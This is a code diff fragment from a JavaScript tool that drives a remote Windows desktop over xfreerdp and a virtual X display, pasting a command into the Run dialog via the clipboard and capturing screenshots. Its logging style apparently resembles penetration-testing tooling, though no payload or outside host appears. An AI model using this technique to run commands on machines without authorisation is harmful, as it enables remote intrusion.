-          `sleep 0.2`,
-          `DISPLAY="$VDISP" xdotool key Escape`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers Escape`,
           `sleep 0.5`,
           // Right-click Start button → Win+X quick-access menu → 'r' opens Run dialog.
           // Avoids Win/Super key (no xkb scancode in Xvfb) and Task Manager compact-mode menu issues.
@@ -17313,19 +17552,27 @@ async function ipcRun(action) {
           `DISPLAY="$VDISP" xdotool click 3`,
           `sleep 1.5`,
           `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/02_winx_menu.xwd" 2>/dev/null && ${scr} "$SCRDIR/02_winx_menu.xwd" "$SCRDIR/02_winx_menu.png" && echo "[*] Screenshot 02_winx_menu saved"`,
+          // Load command into X11 clipboard — xfreerdp CLIPRDR syncs it to Windows.
+          // Avoids xdotool type keysym/layout issues (wrong chars, dropped /, Start.-Process etc.)
+          `command -v xclip >/dev/null 2>&1 || apt-get install -y xclip -qq`,
+          `printf '%s' "${winCmd}" | DISPLAY="$VDISP" xclip -selection clipboard`,
+          `echo "[*] Clipboard set: ${winCmd}"`,
           `echo "[*] Pressing r for Run..."`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers r`,
-          `sleep 1.5`,
+          `sleep 2`,
           `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/03_run_dialog.xwd" 2>/dev/null && ${scr} "$SCRDIR/03_run_dialog.xwd" "$SCRDIR/03_run_dialog.png" && echo "[*] Screenshot 03_run_dialog saved"`,
-          `echo "[*] Typing command..."`,
-          `DISPLAY="$VDISP" xdotool type --clearmodifiers --delay 50 "${winCmd}"`,
-          `sleep 0.5`,
-          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/04_cmd_typed.xwd" 2>/dev/null && ${scr} "$SCRDIR/04_cmd_typed.xwd" "$SCRDIR/04_cmd_typed.png" && echo "[*] Screenshot 04_cmd_typed saved"`,
-          // Re-focus Run dialog Open field before Return — leftover dialogs from prior sessions can
-          // steal focus between the type and Return, sending Enter to the wrong dialog (e.g. Cancel).
-          `DISPLAY="$VDISP" xdotool mousemove --sync 875 651`,
-          `DISPLAY="$VDISP" xdotool click 1`,
+          // Activate Run dialog by window name, select-all, then paste — no keysym translation.
+          `RUNDLG=$(DISPLAY="$VDISP" xdotool search --onlyvisible --name "Run" 2>/dev/null | tail -1)`,
+          `echo "[*] Run dialog WID: $RUNDLG"`,
+          `[ -n "$RUNDLG" ] && DISPLAY="$VDISP" xdotool windowactivate --sync $RUNDLG`,
           `sleep 0.3`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers ctrl+a`,
+          `sleep 0.1`,
+          `DISPLAY="$VDISP" xdotool key --clearmodifiers ctrl+v`,
+          `sleep 0.5`,
+          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/04_cmd_pasted.xwd" 2>/dev/null && ${scr} "$SCRDIR/04_cmd_pasted.xwd" "$SCRDIR/04_cmd_pasted.png" && echo "[*] Screenshot 04_cmd_pasted saved"`,
+          `[ -n "$RUNDLG" ] && DISPLAY="$VDISP" xdotool windowactivate --sync $RUNDLG`,
+          `sleep 0.2`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers Return`,
           `sleep 2`,
           `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/05_after_return.xwd" 2>/dev/null && ${scr} "$SCRDIR/05_after_return.xwd" "$SCRDIR/05_after_return.png" && echo "[*] Screenshot 05_after_return saved"`,
